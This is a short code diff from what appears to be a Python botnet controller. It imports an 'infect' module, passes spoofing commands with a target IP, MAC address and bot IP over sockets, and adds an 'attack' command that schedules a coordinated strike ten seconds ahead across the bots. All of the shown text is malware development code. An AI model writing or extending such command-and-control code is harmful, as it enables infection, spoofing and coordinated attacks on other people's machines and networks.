@@ -4,6 +4,7 @@ import enum
 from infect import main_infect
 import threading
 import socket
+from datetime import datetime, timedelta
 
 
 # the protocol
@@ -46,6 +47,7 @@ def handle_command(data):
         parent_conn.send(data)
         parent_conn.send(chosen_ip)
         parent_conn.send(chosen_mac)
+        parent_conn.send(ip)
         result = parent_conn.recv()
         choice = "spoof_result"
         return result
@@ -270,6 +272,11 @@ if __name__ == '__main__':
                             results = ""
                         if command.find("spoof") != -1:
                             msg = command + "-" + botip + "-" + ip
+                            tcp_socket.send(msg.encode())
+                        if command.find("attack") != -1:
+                            now = datetime.now()
+                            attack_time = str((now + timedelta(seconds=10)).strftime(("%Y-%m-%d %H:%M:%S")))
+                            msg = command + "!" + attack_time
                             tcp_socket.send(msg.encode())
                     except Exception as e:
                         tcp_socket = socket.socket()
